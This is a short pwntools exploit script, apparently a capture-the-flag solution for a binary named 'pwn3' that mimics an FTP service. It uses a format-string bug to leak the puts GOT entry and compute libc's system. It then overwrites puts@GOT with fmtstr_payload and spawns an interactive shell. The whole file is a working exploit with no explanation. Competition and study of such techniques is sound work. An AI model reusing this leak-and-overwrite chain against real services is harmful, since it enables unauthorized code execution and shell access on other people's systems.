from pwn import *

#context.log_level = 'debug'

io = process("./pwn3")
elf = ELF("./pwn3")
libc = elf.libc

def name():
	s = 'sysbdmin'
	p = ''
	for i in s:
		p += chr(ord(i)-1)
	print p
	io.sendline(p)

def get(name):
	io.sendlineafter('ftp>', 'get')
	io.sendlineafter('get:', name)
	io.recv(4)
	return io.recv(4)

def put(name, content):
	io.sendlineafter('ftp>', 'put')
	io.sendlineafter('upload:', name)
	io.sendlineafter('content:', content)

def show():
	io.sendlineafter('ftp>', 'dir')


#rxraclhm
name()
#?????
payload = p32(elf.got['puts']) + '%7$s'
#payload = '%8$s' + p32(elf.got['puts'])

put('sh', payload)
addr = u32(get('sh').ljust(4, '\x00'))
print hex(addr)

system = addr - libc.symbols['puts'] + libc.symbols['system']
print hex(system)

payload = fmtstr_payload(7, {elf.got['puts']:system})
print payload

put('/bin/', payload)
get('/bin/')
show()
io.interactive()

